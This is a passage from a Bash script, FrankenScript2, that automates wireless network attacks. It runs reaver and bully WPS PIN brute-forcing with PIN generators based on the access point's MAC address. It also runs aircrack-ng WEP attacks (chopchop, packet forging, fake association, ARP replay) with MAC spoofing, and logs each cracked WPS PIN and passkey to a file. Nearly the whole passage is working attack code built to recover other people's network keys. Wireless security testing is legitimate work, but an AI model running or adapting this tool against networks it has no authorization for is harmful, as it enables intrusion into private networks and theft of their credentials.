      echo $RED"Recovered passkey & WPS pin has been coppied to$STAND $HOME/FrankenScript2/Recovered-Passkeys.txt"
      echo ""
      read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   fi
fi

rm $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt
}

Reaver_Custom_Settings(){

clear
MAC_Address_Options

echo ""
echo $RED"Current Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid <User_Specified_Options>"
echo ""
read -p $GREEN"Please input any additional reaver options (eg: -vv):$STAND " ReaverOptions
echo ""
echo $RED"New Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions"
echo ""

read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
reaver -i mon0 -c $AP_channel -b $AP_bssid $ReaverOptions -C "sed -i 's/^....//' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt && cat $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $HOME/FrankenScript2/Recovered-Passkeys.txt && echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt && grep 'WPS PIN:' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt >> $HOME/FrankenScript2/Recovered-Passkeys.txt && grep 'WPA PSK:' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt >> $HOME/FrankenScript2/Recovered-Passkeys.txt && echo ' ' >> $HOME/FrankenScript2/Recovered-Passkeys.txt" | tee $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt ]]; then
   Reaver_Passkey_Check=$(grep PSK $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt)
   if [[ $Reaver_Passkey_Check ]]; then
      echo ""
      echo $RED"Recovered passkey & WPS pin has been coppied to$STAND $HOME/FrankenScript2/Recovered-Passkeys.txt"
      echo ""
      read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   fi
fi

rm $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt
}

Reaver_Attack_Options
}

Bully_Attacks(){
Bully_And_WPS_Pin(){

clear
MAC_Address_Options

PinMAC1=$(echo $AP_bssid | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $AP_bssid | sed 's/://g' | cut -c 1-6)
WPSpin1=`python $HOME/FrankenScript2/Scripts/WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python $HOME/FrankenScript2/Scripts/WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python $HOME/FrankenScript2/Scripts/easybox_wps.py $AP_bssid | grep "WPS pin" | cut -c 10-17`
$HOME/FrankenScript2/Scripts/WPSPIN1.5_Generator.sh
echo $WPSpin1 >> $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt
echo $WPSpin2 >> $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt
echo $easybox >> $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt
awk '!_[$1]++' $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt > $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt
sed -ni '/^.\{8\}/p' $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt
PinList=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt)

clear
echo $RED"Possible WPS Pins:"$STAND
Presented_PinList=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt | nl -ba -w 1  -s ': ')
echo ""
echo "$Presented_PinList"
echo ""
read -p $GREEN"Please input the number of your chosen pin, or input $RED"p"$GREEN to manually input a pin:$STAND " grep_AP_line_number

if [[ $grep_AP_line_number == "p" ]]; then
   clear
   read -p $GREEN"Please input the WPS Pin:$STAND " WPS_Pin
   clear
   echo $RED"Bully & WPS-Pin Attack Command:"$STAND
   echo "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid -p $WPS_Pin -F -B -l 60 -v 3"
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
   clear
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt &> /dev/null

   xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt -e "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid -p $WPS_Pin -F -B -l 60 -v 3"

   Recovered_Passkey_Check=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt)
   if [[ $Recovered_Passkey_Check ]]; then
      Recovered_WPSPin=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $4}')
      Recovered_Passkey=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $7}')
      
      echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo WPS PIN: $Recovered_WPSPin >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP PASSKEY: $Recovered_Passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line
      fi

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.txt &> /dev/null

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt
      fi
   fi

   Attack_Detection_And_Options
fi

Chosen_Pin=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt | sed -n ""$grep_AP_line_number"p" | sed 's/^[ \t]*//;s/[ \t]*$//')
clear
echo $RED"Bully & WPS-Pin Attack Command:"$STAND
echo "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid -p $Chosen_Pin -F -B -l 60 -v 3"
echo ""
read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
clear
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt &> /dev/null

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt -e "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid -p $Chosen_Pin -F -B -l 60 -v 3"

   Recovered_Passkey_Check=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt)
   if [[ $Recovered_Passkey_Check ]]; then
      Recovered_WPSPin=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $4}')
      Recovered_Passkey=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_WPSPin.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $7}')
      
      echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo WPS PIN: $Recovered_WPSPin >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP PASSKEY: $Recovered_Passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line
      fi

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.txt &> /dev/null

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt
      fi
   fi
}

Bully_Basic_Attack(){
clear
MAC_Address_Options
clear
echo $RED"Bully Basic Attack Command:"$STAND
echo "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid -F -l 60 -v 3"
echo ""
read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
clear
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Basic.txt &> /dev/null

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Basic.txt -e "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid -F -l 60 -v 3"

   Recovered_Passkey_Check=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Basic.txt)
   if [[ $Recovered_Passkey_Check ]]; then
      Recovered_WPSPin=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Basic.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $4}')
      Recovered_Passkey=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Basic.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $7}')
      
      echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo WPS PIN: $Recovered_WPSPin >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP PASSKEY: $Recovered_Passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line
      fi

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.txt &> /dev/null

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt
      fi
   fi
}

Bully_Custom_Attack(){
clear
MAC_Address_Options
echo ""
echo $RED"Bully Current Attack Command:"$STAND
echo "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid $Bully_Options"
echo ""
read -p $GREEN"Please input any additional Bully options:$STAND " Bully_Options
clear
echo $RED"Bully Custom Attack Command:"$STAND
echo "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid $Bully_Options"
echo ""
read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
clear
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Custom.txt &> /dev/null

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Custom.txt -e "bully mon0 -b $AP_bssid -c $AP_channel -e $AP_essid $Bully_Options"

   Recovered_Passkey_Check=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Custom.txt)
   if [[ $Recovered_Passkey_Check ]]; then
      Recovered_WPSPin=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Custom.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $4}')
      Recovered_Passkey=$(grep "Pin is '........', key is '" $HOME/FrankenScript2/Temp_Working_Dirctory/Bully_Custom.txt | sed -e "s/'//g" -e "s/,//g" | awk '{ print $7}')
      
      echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo WPS PIN: $Recovered_WPSPin >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo AP PASSKEY: $Recovered_Passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
      echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line
      fi

      rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.txt &> /dev/null

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt
      fi

      if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs ]]; then
         mv $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt
      fi
   fi
}

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')

clear
echo $GREEN"[1]$BLUE = Bully & WPS Default Pin.$STAND"
echo $GREEN"[2]$BLUE = Bully Basic Attack.$STAND"
echo $GREEN"[3]$BLUE = Bully Custom Attack (EDIT).$STAND"
echo $GREEN"[0]$BLUE = Return To Scanned APs.$STAND"
read -p $GREEN"Please choose an option$STAND: " Bully_Options

if [[ $Bully_Options == "1" ]]; then
   Bully_And_WPS_Pin
fi

if [[ $Bully_Options == "2" ]]; then
   Bully_Basic_Attack
fi

if [[ $Bully_Options == "3" ]]; then
   Bully_Custom_Attack
fi

if [[ $Bully_Options == "0" ]]; then
   Scanned_APs
fi
}

WEP_Chopchop_Without_Association(){
Chopchop_Without_Association(){
clear
echo "Starting Chopchop"

if [ "$(pidof airodump-ng)" ] 
then
   killall airodump-ng
fi

xterm -geometry 100x28+0+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Chopchop_Check.txt -e "yes | aireplay-ng -4 -b $AP_bssid --ignore-negative-one mon0"

sleep 5

Chopchop_Check=$(grep "Saving keystream" $HOME/FrankenScript2/Temp_Working_Dirctory/Chopchop_Check.txt)
if [[ $Chopchop_Check ]]; then
   clear
   echo "Chopchop was successful"
   sleep 5
   Packetforge
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
fi
}

Packetforge(){
clear
echo "Starting Packetforge"

xterm -geometry 100x28+0+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Packetforge_Check.txt -e "packetforge-ng -0 -a $AP_bssid -h $mon0mac -k 255.255.255.255 -l 255.255.255.255 -y $HOME/FrankenScript2/Temp_Working_Dirctory/*.xor -w $HOME/FrankenScript2/Temp_Working_Dirctory/forged-arp-packet mon0"

sleep 2
clear

Packetforge_Check=$(grep "Wrote packet to:" $HOME/FrankenScript2/Temp_Working_Dirctory/Packetforge_Check.txt)
if [[ $Packetforge_Check ]]; then
   clear
   echo "Packetforge was successful"
   sleep 5
   Airodump
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
   Attack_Detection_And_Options
fi
}

Airodump(){
xterm -geometry 100x16+675+255 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt -e "airodump-ng -c $AP_channel --ignore-negative-one -w $HOME/FrankenScript2/Temp_Working_Dirctory/wep --bssid $AP_bssid mon0" &

sleep 5
clear

Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
if [[ $Airodump_Check ]]; then
   clear
   echo $RED"The access point was detected."$STAND
   sleep 5
   Interactive
else
   echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
   sleep 5
   Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
   if [[ $Airodump_Check ]]; then
      clear
      echo $RED"The access point was detected."$STAND
      sleep 5
      Interactive
   else
      echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
      sleep 5
      Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
      if [[ $Airodump_Check ]]; then
         clear
         echo $RED"The access point was detected."$STAND
         sleep 5
         Interactive
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi
         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Interactive(){
clear
echo "Starting Interactive"

xterm -geometry 100x12+675+500 -e "aireplay-ng -2 -h $mon0mac -F -r $HOME/FrankenScript2/Temp_Working_Dirctory/forged-arp-packet --ignore-negative-one mon0" &

echo "Waiting 15 seconds before checking if the attack is successful"
sleep 15

Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ $Airodump_Data_Count_Check ]]; then
   clear
   echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
   sleep 10
   Aircrack
else
   echo $RED"Re-checking in 10 seconds..."$STAND
   sleep 10
   Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ $Airodump_Data_Count_Check ]]; then
      clear
      echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
      sleep 10
      Aircrack
   else
      echo $RED"Re-checking in 10 seconds..."$STAND
      sleep 10
      Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ $Airodump_Data_Count_Check ]]; then
         clear
         echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
         sleep 10
         Aircrack
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi

         if [ "$(pidof aireplay-ng)" ] 
         then
            killall aireplay-ng
         fi
         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Aircrack(){
clear

xterm -geometry 100x25+0+400 -e "aircrack-ng -b $AP_bssid $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap -l $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt"

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt ]]; then
   passkey=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt)
   clear
   echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo WEP Passkey: $passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo ' ' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   clear
   echo $RED"Target Passkey$STAND: $passkey"
   echo "The recovered passkey has been saved in $HOME/FrankenScript2/Recovered-Passkeys.txt"
   read -p $GREEN"Press [Enter] to finish$STAND"
   Attack_Detection_And_Options
else
   echo "Aircrack failed"
   read -p $GREEN"Press [Enter] to finish$STAND"

   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   Attack_Detection_And_Options
fi
}

cd $HOME/FrankenScript2/Temp_Working_Dirctory

MAC_Address_Options

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')
mon0mac=$(macchanger -s mon0 | grep Current | awk '{ print $3 }')

xterm -geometry 0x0+0+0 -e "airodump-ng -c $AP_channel --bssid $AP_bssid --ignore-negative-one mon0" &

Chopchop_Without_Association

Attack_Detection_And_Options
}

WEP_ARPreplay_With_Association(){
Attempt_Association(){
clear
echo "Attempting Association"
sleep 2

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Association_Check.txt -e "aireplay-ng -1 0 -a $AP_bssid -h $mon0mac -e $AP_essid --ignore-negative-one mon0"

sleep 2
clear

Aireplay_Association_Check=$(grep "Association successful :-)" $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Association_Check.txt)
if [[ $Aireplay_Association_Check ]]; then
   clear
   echo "Association was successful"
   sleep 5
   Airodump
else
   read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
   Attack_Detection_And_Options
fi
}

Airodump(){
if [ "$(pidof airodump-ng)" ] 
then
   killall airodump-ng
fi

xterm -geometry 100x16+675+255 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt -e "airodump-ng -c $AP_channel --ignore-negative-one -w $HOME/FrankenScript2/Temp_Working_Dirctory/wep --bssid $AP_bssid mon0" &

sleep 5
clear

Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
if [[ $Airodump_Check ]]; then
   clear
   echo $RED"The access point was detected."$STAND
   sleep 5
   Attempt_ARPreplay
else
   echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
   sleep 5
   Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
   if [[ $Airodump_Check ]]; then
      clear
      echo $RED"The access point was detected."$STAND
      sleep 5
      Attempt_ARPreplay
   else
      echo $RED"The access point wasn't detected, re-checking in 5 seconds..."$STAND
      sleep 5
      Airodump_Check=$(grep $AP_essid $HOME/FrankenScript2/Temp_Working_Dirctory/*.netxml)
      if [[ $Airodump_Check ]]; then
         clear
         echo $RED"The access point was detected."$STAND
         sleep 5
         Attempt_ARPreplay
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi

         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Attempt_ARPreplay(){
clear
echo "Attempting ARPreplay"
sleep 2

xterm -geometry 100x12+675+500 -e "aireplay-ng -3 -b $AP_bssid -h $mon0mac --ignore-negative-one mon0" &

echo "Waiting 15 seconds before checking if the attack is successful"
sleep 15

Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
if [[ $Airodump_Data_Count_Check ]]; then
   clear
   echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
   sleep 10
   Aircrack
else
   echo $RED"Re-checking in 10 seconds..."$STAND
   sleep 10
   Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
   if [[ $Airodump_Data_Count_Check ]]; then
      clear
      echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
      sleep 10
      Aircrack
   else
      echo $RED"Re-checking in 10 seconds..."$STAND
      sleep 10
      Airodump_Data_Count_Check=$(tac $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Check.txt | grep 'Beacons' -m 1 -B 9999 | tac | sed '1,2d' | head -1 | awk '{ print $5 }' | grep "...")
      if [[ $Airodump_Data_Count_Check ]]; then
         clear
         echo "The data is rising so the attack appears to be successful, proceeding to Aircrack in 10 seconds..."
         sleep 10
         Aircrack
      else
         if [ "$(pidof airodump-ng)" ] 
         then
            killall airodump-ng
         fi

         if [ "$(pidof aireplay-ng)" ] 
         then
            killall aireplay-ng
         fi

         read -p $GREEN"Press $RED[Enter]$GREEN to finish."$STAND
         Attack_Detection_And_Options
      fi
   fi
fi
}

Aircrack(){
clear

xterm -geometry 100x25+0+400 -e "aircrack-ng -b $AP_bssid $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap -l $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt"

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt ]]; then
   passkey=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/WEPpasskey.txt)
   clear
   echo AP ESSID: $AP_essid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo WEP Passkey: $passkey >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo ' ' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   clear
   echo $RED"Target Passkey$STAND: $passkey"
   echo "The recovered passkey has been saved in $HOME/FrankenScript2/Recovered-Passkeys.txt"
   read -p $GREEN"Press [Enter] to finish$STAND"
   Attack_Detection_And_Options
else
   echo "Aircrack failed"
   read -p $GREEN"Press [Enter] to finish$STAND"

   if [ "$(pidof airodump-ng)" ] 
   then
      killall airodump-ng
   fi

   if [ "$(pidof aireplay-ng)" ] 
   then
      killall aireplay-ng
   fi

   Attack_Detection_And_Options
fi
}

cd $HOME/FrankenScript2/Temp_Working_Dirctory

MAC_Address_Options

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }' | sed 's/^[ \t]*//;s/[ \t]*$//')
mon0mac=$(macchanger -s mon0 | grep Current | awk '{ print $3 }' | sed 's/\(.*\)/\U\1/')

xterm -geometry 0x0+0+0 -e "airodump-ng -c $AP_channel --bssid $AP_bssid --ignore-negative-one mon0" &

Attempt_Association

Attack_Detection_And_Options
}

WEP_Chopchop_With_Association(){
Attempt_Association(){
clear
echo "Attempting Association"
sleep 2

xterm -geometry 100x12+675+500 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Aireplay_Association_Check.txt -e "aireplay-ng -1 0 -a $AP_bssid -h $mon0mac -e $AP_essid --ignore-negative-one mon0"

sleep 2
clear

